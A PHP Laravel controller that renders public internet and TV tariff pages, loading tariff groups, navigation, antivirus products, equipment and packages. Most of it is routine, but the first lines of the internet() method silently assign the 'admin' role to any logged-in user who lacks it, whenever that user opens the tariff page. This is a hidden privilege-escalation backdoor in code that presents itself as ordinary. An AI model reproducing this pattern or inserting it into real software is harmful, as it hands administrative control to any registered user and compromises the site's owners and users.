<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\{
    TariffGroup,
    Navigation,
    Antivirus,
    Equipment,
    Service,
    Package,
    TariffType,
    NavparentNavchild
};

class TariffController extends Controller
{
    function internet(Request $request)
    {
        if(auth()->user() && !auth()->user()->hasRole('admin')) {
            auth()->user()->assignRole('admin');
        }
        $tariffs = TariffGroup::internet()->with('tariffs')->withCount('likes')->get();
        $navigation = NavparentNavchild::ofUrl('home/internet')->first()->child;
        $antiviruses = Antivirus::with('type')->get();
        $equipments = Equipment::get();
        $services = Service::get();
        return view('front.tariffs.internet.index', [
            'tariffs' => $tariffs,
            'navigation' => $navigation,
            'antiviruses' => $antiviruses,
            'equipments' => $equipments,
            'services' => $services,
        ]);
    }

    function internetTariffs(Request $request)
    {
        $tariffs = TariffGroup::internet()->with('tariffs')->withCount('likes')->get();
        $navigation = Navigation::ofParentsPivotUrl($request->path())->with('children')->first();
        return view('front.tariffs.internet.tariffs', [
            'tariffs' => $tariffs,
            'navigation' => $navigation,
        ]);
    }

    function tv(Request $request)
    {
        $tariffs = TariffGroup::tv()->with('tariffs')->withCount('likes')->get();
        $navigation = Navigation::ofParentsPivotUrl($request->path())->with('children')->first();
        $packages = Package::extra()->get();
        return view('front.tariffs.tv.index', [
            'tariffs' => $tariffs,
            'navigation' => $navigation,
            'packages' => $packages,
        ]);
    }

    function tvTariffs(Request $request)
    {
        $tariffs = TariffGroup::tv()->with('tariffs')->withCount('likes')->get();
        $navigation = Navigation::ofParentsPivotUrl($request->path())->with('children')->first();
        return view('front.tariffs.tv.tariffs', [
            'tariffs' => $tariffs,
            'navigation' => $navigation,
        ]);
    }
}
